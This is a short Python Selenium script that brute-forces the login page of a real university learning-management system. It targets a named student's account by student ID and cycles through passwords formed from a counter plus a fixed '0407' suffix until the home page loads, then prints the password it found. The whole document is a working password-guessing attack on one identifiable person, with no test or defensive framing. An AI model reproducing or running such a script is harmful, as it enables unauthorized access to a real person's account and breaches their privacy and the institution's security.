from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException



def new_connection(driver):
    driver.get("https://lms.nthu.edu.tw/login_page.php?ssl=1&from=%2Fhome.php")
    username_tag = driver.find_element_by_id('loginAccount')
    password_tag = driver.find_element_by_id('loginPasswd')
    return username_tag,password_tag
    


driver = webdriver.Chrome(executable_path='D:\\python\\chromedriver.exe')
username_tag, password_tag = new_connection(driver)

# 吳大均
username = "105022204"
unknown = 15000
password = str(unknown)[1:]+"0407"

while True:
    try:
        print("Testing Password:",password)
        username_tag.send_keys(username)
        password_tag.send_keys(password)
        driver.find_element_by_xpath("//input[@onclick='m_loginSubmit()']").click()
        WebDriverWait(driver, 2).until(EC.alert_is_present())
    except TimeoutException:
        if driver.current_url=="https://lms.nthu.edu.tw/home.php":
            print("You Got It!")
            print("Correct Password:",password)
            break
        else:
            print("New Connection")
            username_tag, password_tag = new_connection(driver)
    else:
        driver.switch_to.alert.accept()
    finally:
        username_tag.clear()
        password_tag.clear()
        unknown +=1
        password = str(unknown)[1:]+"0407"